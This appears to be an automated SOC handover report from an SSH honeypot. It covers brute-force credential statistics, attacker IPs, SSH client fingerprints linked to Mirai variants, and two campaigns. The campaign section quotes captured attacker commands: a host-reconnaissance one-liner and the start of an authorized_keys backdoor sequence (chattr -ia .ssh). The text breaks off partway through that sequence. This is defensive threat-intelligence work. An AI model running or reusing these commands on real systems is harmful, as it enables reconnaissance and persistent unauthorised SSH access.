# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-29 |
| **Generated At** | 2026-08-29T16:28:09Z |
| **Shift Time** | 16:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **401** |
| Confirmed Threats | **376** |
| False Positives Filtered | **25** (6.2%) |
| Unique Attacker IPs | **145** |
| Countries of Origin | **47** |
| High Severity Cases | **292** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **109** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **349** |
| Unique Credential Pairs | **237** |
| Unique Usernames | **34** |
| Unique Passwords | **165** |
| Successful Auth Pairs | **320** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 86 |
| `admin` | 34 |
| `ubuntu` | 27 |
| `debian` | 19 |
| `ubnt` | 19 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `1` | 13 |
| `123456` | 10 |
| `123456789` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 7 |
| `blank` | `blank666` | 6 |
| `test` | `666666` | 6 |
| `support` | `support` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `debian` | `123456789` | `80.94.92.179` | 2026-08-29T10:55:03 |
| `debian` | `admin` | `80.94.92.179` | 2026-08-29T10:56:14 |
| `root` | `mongodb@2024` | `217.60.255.130` | 2026-08-29T10:57:01 |
| `ubuntu` | `Sabir@123` | `217.60.255.130` | 2026-08-29T10:57:15 |
| `debian` | `debian` | `80.94.92.179` | 2026-08-29T10:57:25 |
| `debian` | `debian123` | `80.94.92.179` | 2026-08-29T10:58:40 |
| `debian` | `password` | `80.94.92.179` | 2026-08-29T10:59:58 |
| `debian` | `root` | `80.94.92.179` | 2026-08-29T11:01:17 |
| `ubnt` | `22222` | `81.22.51.64` | 2026-08-29T11:02:08 |
| `ubnt` | `22222` | `189.56.0.19` | 2026-08-29T11:02:23 |
| `deploy` | `deploy` | `80.94.92.179` | 2026-08-29T11:02:31 |
| `docker` | `123456` | `80.94.92.179` | 2026-08-29T11:03:43 |
| `blank` | `blank000` | `10.0.0.73` | 2026-08-29T11:04:01 |
| `docker` | `123456789` | `80.94.92.179` | 2026-08-29T11:05:00 |
| `docker` | `docker` | `80.94.92.179` | 2026-08-29T11:06:14 |
| `ubuntu` | `Aeiou@123` | `217.60.255.130` | 2026-08-29T11:06:37 |
| `docker` | `root` | `80.94.92.179` | 2026-08-29T11:07:25 |
| `root` | `P@@ssw0rd` | `217.60.255.130` | 2026-08-29T11:07:37 |
| `dspace` | `12345` | `80.94.92.179` | 2026-08-29T11:08:35 |
| `user5` | `123456` | `154.57.216.142` | 2026-08-29T11:09:13 |
| `345gs5662d34` | `345gs5662d34` | `154.57.216.142` | 2026-08-29T11:09:17 |
| `user5` | `3245gs5662d34` | `154.57.216.142` | 2026-08-29T11:09:18 |
| `dspace` | `123456789` | `80.94.92.179` | 2026-08-29T11:09:45 |
| `root` | `asd!@#123` | `78.109.200.147` | 2026-08-29T11:09:58 |
| `345gs5662d34` | `345gs5662d34` | `78.109.200.147` | 2026-08-29T11:10:02 |
| `root` | `3245gs5662d34` | `78.109.200.147` | 2026-08-29T11:10:03 |
| `dspace` | `admin` | `80.94.92.179` | 2026-08-29T11:10:53 |
| `dspace` | `dspace` | `80.94.92.179` | 2026-08-29T11:12:02 |
| `dspace` | `dspace1` | `80.94.92.179` | 2026-08-29T11:13:11 |
| `dspace` | `dspace123` | `80.94.92.179` | 2026-08-29T11:14:19 |
| `dspace` | `welcome` | `80.94.92.179` | 2026-08-29T11:15:28 |
| `ubuntu` | `Akash@123` | `217.60.255.130` | 2026-08-29T11:16:13 |
| `ftp` | `123456` | `80.94.92.179` | 2026-08-29T11:16:36 |
| `ubnt` | `22222` | `46.101.9.55` | 2026-08-29T11:17:17 |
| `ubnt` | `22222` | `125.72.150.250` | 2026-08-29T11:17:29 |
| `ftp` | `admin` | `80.94.92.179` | 2026-08-29T11:17:46 |
| `root` | `2wsx#EDC` | `217.60.255.130` | 2026-08-29T11:18:25 |
| `ftp` | `ftp` | `80.94.92.179` | 2026-08-29T11:18:56 |
| `ubuntu` | `Password1!` | `10.0.0.73` | 2026-08-29T11:19:40 |
| `test` | `!QAZ2wsx` | `10.0.0.73` | 2026-08-29T11:19:42 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-08-29T11:19:43 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T11:19:45 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T11:19:46 |
| `git` | `123` | `80.94.92.179` | 2026-08-29T11:20:23 |
| `kiranm` | `kiranm` | `10.0.0.73` | 2026-08-29T11:20:36 |
| `blank` | `blank000` | `112.94.5.43` | 2026-08-29T11:20:38 |
| `kiranm` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T11:20:39 |
| `git` | `12345` | `80.94.92.179` | 2026-08-29T11:21:32 |
| `git` | `123456` | `80.94.92.179` | 2026-08-29T11:22:33 |
| `git` | `123456789` | `80.94.92.179` | 2026-08-29T11:23:38 |
| `ubnt` | `9999999` | `201.208.172.85` | 2026-08-29T11:23:39 |
| `ubnt` | `9999999` | `103.129.59.62` | 2026-08-29T11:23:48 |
| `git` | `1234qwer` | `80.94.92.179` | 2026-08-29T11:24:43 |
| `support` | `support` | `176.53.159.196` | 2026-08-29T11:24:56 |
| `support` | `1` | `103.7.60.253` | 2026-08-29T11:25:18 |
| `support` | `1` | `183.89.208.174` | 2026-08-29T11:25:27 |
| `ubuntu` | `Pratap@123` | `217.60.255.130` | 2026-08-29T11:25:49 |
| `git` | `123qwe` | `80.94.92.179` | 2026-08-29T11:25:49 |
| `mysql` | `1qaz2wsx` | `10.0.0.73` | 2026-08-29T11:26:43 |
| `mysql` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T11:26:47 |
| `git` | `P@ssw0rd` | `80.94.92.179` | 2026-08-29T11:26:54 |
| `git` | `admin` | `80.94.92.179` | 2026-08-29T11:28:01 |
| `root` | `ADMIN@123` | `217.60.255.130` | 2026-08-29T11:29:02 |
| `git` | `git` | `80.94.92.179` | 2026-08-29T11:29:08 |
| `git` | `git123` | `80.94.92.179` | 2026-08-29T11:30:19 |
| `git` | `p@ssw0rd` | `80.94.92.179` | 2026-08-29T11:31:30 |
| `git` | `password` | `80.94.92.179` | 2026-08-29T11:32:41 |
| `admin` | `admin111` | `10.0.0.73` | 2026-08-29T11:32:53 |
| `git` | `qwerty` | `80.94.92.179` | 2026-08-29T11:33:50 |
| `admin` | `admin111` | `78.72.168.178` | 2026-08-29T11:34:10 |
| `admin` | `admin111` | `210.0.90.81` | 2026-08-29T11:34:19 |
| `git` | `root` | `80.94.92.179` | 2026-08-29T11:34:59 |
| `ubuntu` | `Abhay@123` | `217.60.255.130` | 2026-08-29T11:35:15 |
| `git` | `test` | `80.94.92.179` | 2026-08-29T11:36:08 |
| `support` | `1` | `10.0.0.73` | 2026-08-29T11:36:24 |
| `git` | `test123` | `80.94.92.179` | 2026-08-29T11:37:20 |
| `ubnt` | `11` | `10.0.0.73` | 2026-08-29T11:38:04 |
| `guest` | `12345` | `80.94.92.179` | 2026-08-29T11:38:30 |
| `guest` | `123456` | `80.94.92.179` | 2026-08-29T11:39:31 |
| `root` | `QWERTY!@#` | `217.60.255.130` | 2026-08-29T11:39:55 |
| `guest` | `123456789` | `80.94.92.179` | 2026-08-29T11:40:32 |
| `guest` | `admin` | `80.94.92.179` | 2026-08-29T11:41:33 |
| `guest` | `guest` | `80.94.92.179` | 2026-08-29T11:42:35 |
| `guest` | `guest1` | `80.94.92.179` | 2026-08-29T11:43:41 |
| `root` | `Lol12345` | `101.47.8.188` | 2026-08-29T11:43:43 |
| `345gs5662d34` | `345gs5662d34` | `101.47.8.188` | 2026-08-29T11:43:59 |
| `root` | `3245gs5662d34` | `101.47.8.188` | 2026-08-29T11:44:11 |
| `guest` | `guest123` | `80.94.92.179` | 2026-08-29T11:44:47 |
| `ubuntu` | `Chat@123` | `217.60.255.130` | 2026-08-29T11:44:50 |
| `guest` | `password` | `80.94.92.179` | 2026-08-29T11:45:55 |
| `guest` | `welcome` | `80.94.92.179` | 2026-08-29T11:47:01 |
| `hadoop` | `123` | `80.94.92.179` | 2026-08-29T11:48:10 |
| `hadoop` | `123456` | `80.94.92.179` | 2026-08-29T11:49:23 |
| `admin` | `admin111` | `61.93.135.225` | 2026-08-29T11:49:31 |
| `admin` | `admin111` | `122.176.23.166` | 2026-08-29T11:49:40 |
| `root` | `Bismillah123` | `217.60.255.130` | 2026-08-29T11:50:44 |
| `support` | `support` | `10.0.0.73` | 2026-08-29T11:51:47 |
| `support` | `1` | `120.234.195.41` | 2026-08-29T11:52:44 |
| `ubuntu` | `Satyam@123` | `217.60.255.130` | 2026-08-29T11:54:26 |
| `ubnt` | `11` | `65.20.158.10` | 2026-08-29T11:55:24 |
| `ubnt` | `11` | `179.184.85.167` | 2026-08-29T11:55:32 |
| `ubnt` | `11` | `49.206.194.29` | 2026-08-29T11:55:37 |
| `ubnt` | `11` | `213.149.216.10` | 2026-08-29T11:55:44 |
| `support` | `33333` | `36.64.211.93` | 2026-08-29T11:57:45 |
| `support` | `33333` | `95.79.57.221` | 2026-08-29T11:57:55 |
| `root` | `Superuser` | `217.60.255.130` | 2026-08-29T12:01:22 |
| `root` | `Yz123456@` | `135.125.235.107` | 2026-08-29T12:01:28 |
| `345gs5662d34` | `345gs5662d34` | `135.125.235.107` | 2026-08-29T12:01:30 |
| `root` | `3245gs5662d34` | `135.125.235.107` | 2026-08-29T12:01:31 |
| `ubuntu` | `Tech@12345` | `217.60.255.130` | 2026-08-29T12:03:59 |
| `root` | `1` | `195.178.110.227` | 2026-08-29T12:04:19 |
| `support` | `support33` | `10.0.0.73` | 2026-08-29T12:04:54 |
| `root` | `12` | `195.178.110.227` | 2026-08-29T12:06:07 |
| `support` | `support33` | `103.180.88.203` | 2026-08-29T12:06:23 |
| `root` | `123` | `195.178.110.227` | 2026-08-29T12:07:51 |
| `root` | `1234` | `195.178.110.227` | 2026-08-29T12:09:44 |
| `hamed` | `12345678` | `69.6.234.27` | 2026-08-29T12:10:11 |
| `345gs5662d34` | `345gs5662d34` | `69.6.234.27` | 2026-08-29T12:10:14 |
| `hamed` | `3245gs5662d34` | `69.6.234.27` | 2026-08-29T12:10:14 |
| `root` | `12345` | `195.178.110.227` | 2026-08-29T12:11:34 |
| `root` | `Microsoft@2025` | `217.60.255.130` | 2026-08-29T12:12:25 |
| `root` | `li123456.` | `185.183.120.48` | 2026-08-29T12:13:01 |
| `345gs5662d34` | `345gs5662d34` | `185.183.120.48` | 2026-08-29T12:13:04 |
| `root` | `3245gs5662d34` | `185.183.120.48` | 2026-08-29T12:13:05 |
| `sens` | `sens` | `180.93.172.213` | 2026-08-29T12:13:29 |
| `345gs5662d34` | `345gs5662d34` | `180.93.172.213` | 2026-08-29T12:13:34 |
| `sens` | `3245gs5662d34` | `180.93.172.213` | 2026-08-29T12:13:36 |
| `ubuntu` | `azerty` | `217.60.255.130` | 2026-08-29T12:13:37 |
| `root` | `1234567` | `195.178.110.227` | 2026-08-29T12:15:02 |
| `root` | `12345678` | `195.178.110.227` | 2026-08-29T12:16:49 |
| `root` | `123456789` | `195.178.110.227` | 2026-08-29T12:18:34 |
| `root` | `1234567890` | `195.178.110.227` | 2026-08-29T12:20:21 |
| `support` | `support33` | `23.30.11.253` | 2026-08-29T12:21:43 |
| `support` | `support33` | `62.201.212.54` | 2026-08-29T12:21:50 |
| `root` | `123qwe` | `195.178.110.227` | 2026-08-29T12:22:03 |
| `root` | `vps123456` | `217.60.255.130` | 2026-08-29T12:23:38 |
| `ubuntu` | `nimda@123` | `217.60.255.130` | 2026-08-29T12:23:38 |
| `root` | `123qwerty` | `195.178.110.227` | 2026-08-29T12:23:45 |
| `support` | `33333` | `62.201.228.210` | 2026-08-29T12:25:02 |
| `root` | `21` | `195.178.110.227` | 2026-08-29T12:25:29 |
| `root` | `321` | `195.178.110.227` | 2026-08-29T12:27:13 |
| `blank` | `blank888` | `82.67.175.124` | 2026-08-29T12:27:41 |
| `blank` | `blank888` | `47.247.73.99` | 2026-08-29T12:27:51 |
| `blank` | `blank888` | `111.70.11.38` | 2026-08-29T12:28:02 |
| `root` | `4321` | `195.178.110.227` | 2026-08-29T12:28:51 |
| `root` | `54321` | `195.178.110.227` | 2026-08-29T12:30:34 |
| `root` | `654321` | `195.178.110.227` | 2026-08-29T12:32:18 |
| `ubuntu` | `Outlook@123` | `217.60.255.130` | 2026-08-29T12:33:20 |
| `root` | `P4ssw0rd` | `195.178.110.227` | 2026-08-29T12:34:06 |
| `root` | `12345678a` | `217.60.255.130` | 2026-08-29T12:34:35 |
| `root` | `P4ssword` | `195.178.110.227` | 2026-08-29T12:36:14 |
| `debian` | `1` | `10.0.0.73` | 2026-08-29T12:37:05 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-08-29T12:38:15 |
| `debian` | `1` | `103.203.74.119` | 2026-08-29T12:38:38 |
| `debian` | `1` | `109.233.21.109` | 2026-08-29T12:38:50 |
| `root` | `Passw0rd` | `195.178.110.227` | 2026-08-29T12:39:52 |
| `centos` | `centos888` | `10.0.0.73` | 2026-08-29T12:41:04 |
| `root` | `p4ssword` | `195.178.110.227` | 2026-08-29T12:41:33 |
| `admin` | `00` | `10.0.0.73` | 2026-08-29T12:42:29 |
| `ubuntu` | `Mobin1234` | `217.60.255.130` | 2026-08-29T12:43:01 |
| `root` | `p@ssw0rd` | `195.178.110.227` | 2026-08-29T12:43:15 |
| `root` | `passw0rd` | `195.178.110.227` | 2026-08-29T12:44:57 |
| `root` | `123qwerty` | `217.60.255.130` | 2026-08-29T12:45:20 |
| `root` | `password` | `195.178.110.227` | 2026-08-29T12:46:48 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-29T12:47:15 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-29T12:47:15 |
| `root` | `qwerty` | `195.178.110.227` | 2026-08-29T12:48:54 |
| `dubai` | `dubai` | `200.46.212.206` | 2026-08-29T12:50:37 |
| `345gs5662d34` | `345gs5662d34` | `200.46.212.206` | 2026-08-29T12:50:39 |
| `dubai` | `3245gs5662d34` | `200.46.212.206` | 2026-08-29T12:50:40 |
| `ubuntu` | `Nader1234` | `217.60.255.130` | 2026-08-29T12:52:27 |
| `root` | `root1` | `195.178.110.227` | 2026-08-29T12:52:50 |
| `debian` | `1` | `117.247.51.66` | 2026-08-29T12:53:52 |
| `debian` | `1` | `41.65.118.172` | 2026-08-29T12:53:58 |
| `root` | `root12` | `195.178.110.227` | 2026-08-29T12:54:29 |
| `jessica` | `123` | `118.27.150.95` | 2026-08-29T12:54:31 |
| `345gs5662d34` | `345gs5662d34` | `118.27.150.95` | 2026-08-29T12:54:35 |
| `jessica` | `3245gs5662d34` | `118.27.150.95` | 2026-08-29T12:54:37 |
| `root` | `root123` | `195.178.110.227` | 2026-08-29T12:56:09 |
| `root` | `Adam@1234` | `217.60.255.130` | 2026-08-29T12:56:17 |
| `centos` | `centos888` | `111.70.29.158` | 2026-08-29T12:57:28 |
| `centos` | `centos888` | `112.29.68.22` | 2026-08-29T12:57:42 |
| `root` | `root1234` | `195.178.110.227` | 2026-08-29T12:57:46 |
| `root` | `root12345` | `195.178.110.227` | 2026-08-29T12:59:28 |
| `admin` | `00` | `200.159.14.187` | 2026-08-29T13:00:15 |
| `admin` | `00` | `1.212.225.99` | 2026-08-29T13:00:29 |
| `admin` | `00` | `196.203.231.220` | 2026-08-29T13:00:40 |
| `root` | `root123456` | `195.178.110.227` | 2026-08-29T13:01:07 |
| `ubuntu` | `Salam@1234` | `217.60.255.130` | 2026-08-29T13:02:08 |
| `test` | `88888` | `218.149.235.152` | 2026-08-29T13:02:29 |
| `test` | `88888` | `81.214.75.248` | 2026-08-29T13:02:37 |
| `root` | `root1234567` | `195.178.110.227` | 2026-08-29T13:02:50 |
| `root` | `root123456789` | `195.178.110.227` | 2026-08-29T13:04:31 |
| `root` | `root1234567890` | `195.178.110.227` | 2026-08-29T13:06:16 |
| `root` | `P@ssw0rd#` | `217.60.255.130` | 2026-08-29T13:07:09 |
| `admin` | `1` | `195.178.110.227` | 2026-08-29T13:08:12 |
| `nobody` | `nobody77` | `10.0.0.73` | 2026-08-29T13:09:29 |
| `admin` | `12` | `195.178.110.227` | 2026-08-29T13:10:03 |
| `ubuntu` | `Imam@123` | `217.60.255.130` | 2026-08-29T13:11:43 |
| `admin` | `123` | `195.178.110.227` | 2026-08-29T13:12:00 |
| `test` | `88888` | `10.0.0.73` | 2026-08-29T13:13:18 |
| `admin` | `1234` | `195.178.110.227` | 2026-08-29T13:14:08 |
| `user` | `111111` | `10.0.0.73` | 2026-08-29T13:14:57 |
| `admin` | `12345` | `195.178.110.227` | 2026-08-29T13:15:57 |
| `admin` | `123456` | `195.178.110.227` | 2026-08-29T13:17:34 |
| `root` | `Admin-123` | `217.60.255.130` | 2026-08-29T13:17:39 |
| `admin` | `1234567` | `195.178.110.227` | 2026-08-29T13:19:21 |
| `ubuntu` | `Salam123` | `217.60.255.130` | 2026-08-29T13:21:04 |
| `admin` | `12345678` | `195.178.110.227` | 2026-08-29T13:21:13 |
| `root` | `Qwerty@12345` | `174.97.200.219` | 2026-08-29T13:21:40 |
| `345gs5662d34` | `345gs5662d34` | `174.97.200.219` | 2026-08-29T13:21:41 |
| `root` | `3245gs5662d34` | `174.97.200.219` | 2026-08-29T13:21:41 |
| `admin` | `123456789` | `195.178.110.227` | 2026-08-29T13:23:02 |
| `admin` | `1234567890` | `195.178.110.227` | 2026-08-29T13:24:49 |
| `nobody` | `nobody77` | `182.95.190.150` | 2026-08-29T13:26:20 |
| `nobody` | `nobody77` | `112.30.68.155` | 2026-08-29T13:26:30 |
| `admin` | `123qwe` | `195.178.110.227` | 2026-08-29T13:26:38 |
| `admin` | `123qwerty` | `195.178.110.227` | 2026-08-29T13:28:21 |
| `root` | `123Admin` | `217.60.255.130` | 2026-08-29T13:28:35 |
| `test` | `88888` | `65.20.138.46` | 2026-08-29T13:29:58 |
| `admin` | `21` | `195.178.110.227` | 2026-08-29T13:30:12 |
| `ubuntu` | `1qaz@WSXcde3` | `217.60.255.130` | 2026-08-29T13:30:40 |
| `admin` | `321` | `195.178.110.227` | 2026-08-29T13:32:02 |
| `user` | `111111` | `43.250.106.18` | 2026-08-29T13:32:36 |
| `user` | `111111` | `90.70.76.142` | 2026-08-29T13:32:43 |
| `user` | `111111` | `197.156.97.198` | 2026-08-29T13:32:51 |
| `admin` | `654321` | `195.178.110.227` | 2026-08-29T13:33:52 |
| `blank` | `blank666` | `75.64.135.45` | 2026-08-29T13:34:43 |
| `blank` | `blank666` | `178.178.222.59` | 2026-08-29T13:34:50 |
| `admin` | `Password` | `195.178.110.227` | 2026-08-29T13:35:50 |
| `admin` | `admin` | `195.178.110.227` | 2026-08-29T13:37:41 |
| `root` | `1qazxsw2` | `217.60.255.130` | 2026-08-29T13:39:22 |
| `admin` | `admin1` | `195.178.110.227` | 2026-08-29T13:39:26 |
| `ubuntu` | `@password` | `217.60.255.130` | 2026-08-29T13:40:18 |
| `admin` | `admin12` | `195.178.110.227` | 2026-08-29T13:41:12 |
| `ubnt` | `3` | `10.0.0.73` | 2026-08-29T13:41:54 |
| `admin` | `admin123` | `195.178.110.227` | 2026-08-29T13:42:57 |
| `ubnt` | `3` | `41.178.230.115` | 2026-08-29T13:43:25 |
| `ubnt` | `3` | `65.20.251.41` | 2026-08-29T13:43:33 |
| `admin` | `pa$w0rd` | `195.178.110.227` | 2026-08-29T13:44:39 |
| `blank` | `blank666` | `10.0.0.73` | 2026-08-29T13:45:49 |
| `admin` | `passw0rd` | `195.178.110.227` | 2026-08-29T13:46:27 |
| `user` | `user99` | `10.0.0.73` | 2026-08-29T13:47:29 |
| `admin` | `password` | `195.178.110.227` | 2026-08-29T13:48:05 |
| `ubuntu` | `Test@12345` | `217.60.255.130` | 2026-08-29T13:49:41 |
| `admin` | `qwerty` | `195.178.110.227` | 2026-08-29T13:49:44 |
| `root` | `Qazwsxedc` | `217.60.255.130` | 2026-08-29T13:49:58 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-08-29T13:51:10 |
| `backup` | `123qwe` | `195.178.110.227` | 2026-08-29T13:51:33 |
| `backup` | `54321` | `195.178.110.227` | 2026-08-29T13:53:15 |
| `backup` | `backup` | `195.178.110.227` | 2026-08-29T13:54:55 |
| `backup` | `backup1` | `195.178.110.227` | 2026-08-29T13:56:37 |
| `backup` | `backup12` | `195.178.110.227` | 2026-08-29T13:58:12 |
| `ubuntu` | `pass123` | `217.60.255.130` | 2026-08-29T13:59:25 |
| `backup` | `backup123` | `195.178.110.227` | 2026-08-29T13:59:57 |
| `root` | `123qwe!@#` | `217.60.255.130` | 2026-08-29T14:00:56 |
| `backup` | `wasd` | `195.178.110.227` | 2026-08-29T14:01:50 |
| `blank` | `blank666` | `116.228.195.251` | 2026-08-29T14:02:17 |
| `blank` | `blank666` | `62.221.107.99` | 2026-08-29T14:02:25 |
| `debian` | `123qwe` | `195.178.110.227` | 2026-08-29T14:03:44 |
| `user` | `user99` | `103.171.39.147` | 2026-08-29T14:05:04 |
| `debian` | `54321` | `195.178.110.227` | 2026-08-29T14:05:33 |
| `debian` | `654321` | `195.178.110.227` | 2026-08-29T14:07:13 |
| `user` | `888` | `182.76.71.82` | 2026-08-29T14:07:21 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8e\x8e\x8e\x8e\x8e\x8e\x8e\x8e'` | `14.47.200.242` | 2026-08-29T14:07:50 |
| `lghkel	` | `zpz}ld	` | `14.47.200.242` | 2026-08-29T14:07:51 |
| `"??$` | `$#7?9>7?>` | `14.47.200.242` | 2026-08-29T14:08:25 |
| `debian` | `debian` | `195.178.110.227` | 2026-08-29T14:08:58 |
| `ubuntu` | `Abcd!234` | `217.60.255.130` | 2026-08-29T14:09:00 |
| `default` | `tlJwpbo6` | `14.47.200.242` | 2026-08-29T14:09:33 |
| `root` | `7ujMko0admin` | `14.47.200.242` | 2026-08-29T14:10:08 |
| `debian` | `debian12` | `195.178.110.227` | 2026-08-29T14:10:46 |
| `"??$` | `89ceah` | `14.47.200.242` | 2026-08-29T14:11:17 |
| `root` | `postgres@1234` | `217.60.255.130` | 2026-08-29T14:11:26 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\xdf\xda\xd3\xd7\xd0'` | `14.47.200.242` | 2026-08-29T14:11:51 |
| `"??$` | `4"51=2?(` | `14.47.200.242` | 2026-08-29T14:12:25 |
| `debian` | `debian123` | `195.178.110.227` | 2026-08-29T14:12:34 |
| `root` | `xc3511` | `14.47.200.242` | 2026-08-29T14:12:59 |
| `operator` | `operator2007` | `10.0.0.73` | 2026-08-29T14:14:09 |
| `debian` | `pa55word` | `195.178.110.227` | 2026-08-29T14:14:18 |
| `operator` | `operator2007` | `210.177.143.61` | 2026-08-29T14:15:41 |
| `debian` | `qwerty` | `195.178.110.227` | 2026-08-29T14:16:10 |
| `deploy` | `1` | `195.178.110.227` | 2026-08-29T14:18:07 |
| `user` | `888` | `10.0.0.73` | 2026-08-29T14:18:17 |
| `ubuntu` | `Moslem2026` | `217.60.255.130` | 2026-08-29T14:18:47 |
| `deploy` | `12` | `195.178.110.227` | 2026-08-29T14:19:59 |
| `test` | `666666` | `10.0.0.73` | 2026-08-29T14:20:00 |
| `steam` | `steam123` | `120.48.118.142` | 2026-08-29T14:20:14 |
| `root` | `1234qwer!@#$QWER` | `217.60.255.130` | 2026-08-29T14:22:53 |
| `root` | `ahmedandmona` | `103.86.198.253` | 2026-08-29T14:22:58 |
| `345gs5662d34` | `345gs5662d34` | `103.86.198.253` | 2026-08-29T14:23:02 |
| `root` | `3245gs5662d34` | `103.86.198.253` | 2026-08-29T14:23:04 |
| `root` | `!Qq123456` | `161.132.54.218` | 2026-08-29T14:24:57 |
| `345gs5662d34` | `345gs5662d34` | `161.132.54.218` | 2026-08-29T14:25:00 |
| `root` | `3245gs5662d34` | `161.132.54.218` | 2026-08-29T14:25:00 |
| `ubuntu` | `Mohamad123` | `217.60.255.130` | 2026-08-29T14:28:36 |
| `operator` | `operator2007` | `122.166.253.226` | 2026-08-29T14:31:19 |
| `operator` | `operator2007` | `186.238.242.194` | 2026-08-29T14:31:28 |
| `root` | `12345a@` | `217.60.255.130` | 2026-08-29T14:33:54 |
| `user` | `888` | `103.147.248.44` | 2026-08-29T14:34:51 |
| `root` | `111111` | `2.57.122.150` | 2026-08-29T14:35:27 |
| `root` | `123` | `2.57.122.150` | 2026-08-29T14:37:30 |
| `test` | `666666` | `190.223.36.108` | 2026-08-29T14:37:39 |
| `test` | `666666` | `43.224.227.156` | 2026-08-29T14:37:48 |
| `test` | `666666` | `112.161.26.125` | 2026-08-29T14:37:53 |
| `test` | `666666` | `89.253.90.113` | 2026-08-29T14:38:01 |
| `ubuntu` | `Payam@1234` | `217.60.255.130` | 2026-08-29T14:38:29 |
| `root` | `123123` | `2.57.122.150` | 2026-08-29T14:39:36 |
| `ubnt` | `ubnt11` | `172.90.128.97` | 2026-08-29T14:39:40 |
| `ubnt` | `ubnt11` | `103.93.37.178` | 2026-08-29T14:39:49 |
| `root` | `123321` | `2.57.122.150` | 2026-08-29T14:41:48 |
| `root` | `1234` | `2.57.122.150` | 2026-08-29T14:44:00 |
| `root` | `zxcv123!` | `217.60.255.130` | 2026-08-29T14:44:57 |
| `root` | `12345` | `2.57.122.150` | 2026-08-29T14:46:06 |
| `test` | `7` | `10.0.0.73` | 2026-08-29T14:46:45 |
| `ubuntu` | `Yunes123` | `217.60.255.130` | 2026-08-29T14:48:04 |
| `test` | `7` | `177.174.16.55` | 2026-08-29T14:48:17 |
| `root` | `1234567` | `2.57.122.150` | 2026-08-29T14:50:06 |
| `ubnt` | `ubnt11` | `10.0.0.73` | 2026-08-29T14:50:52 |
| `user` | `user333` | `10.0.0.73` | 2026-08-29T14:52:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **401** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 143 |
| libssh | 98 |
| OpenSSH | 65 |
| Unknown | 2 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 133 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 65 | 65 |
| `419da4c91ddb...` | Modern SSH client | 47 | 1 |
| `f555226df196...` | Mirai/variant | 35 | 13 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 133 | 3 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 65 | 65 | Mirai/variant |
| `419da4c91ddb...` | libssh | 47 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 35 | 13 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 130 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.150`, `195.178.110.227`, `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
